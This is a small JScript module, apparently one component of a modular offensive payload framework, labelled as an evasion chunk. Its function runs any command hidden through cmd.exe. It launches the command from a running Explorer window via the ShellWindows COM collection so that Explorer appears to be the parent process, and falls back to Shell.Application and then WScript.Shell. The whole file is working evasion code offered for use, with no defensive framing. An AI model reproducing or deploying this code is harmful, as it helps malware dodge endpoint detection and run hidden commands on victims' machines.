// chunk: evasion/process_shellwindows
// depends: (none)
// provides: create_process
// format: jscript
// note: Creates processes by finding a running Explorer.exe via the
//       ShellWindows collection and using its Document.Application context.
//       Falls back to Shell.Application if no Explorer window exists.

function create_process(cmd) {
    try {
        var sw = new ActiveXObject("Shell.Application").Windows();
        var launched = false;
        for (var i = 0; i < sw.Count; i++) {
            try {
                var win = sw.Item(i);
                if (win && win.FullName && win.FullName.toLowerCase().indexOf("explorer") >= 0) {
                    win.Document.Application.ShellExecute("cmd.exe", "/c " + cmd, "", "", 0);
                    launched = true;
                    break;
                }
            } catch(e2) {}
        }
        if (!launched) {
            var app = new ActiveXObject("Shell.Application");
            app.ShellExecute("cmd.exe", "/c " + cmd, "", "", 0);
        }
    } catch(e) {
        var sh = new ActiveXObject("WScript.Shell");
        sh.Run(cmd, 0, false);
    }
}
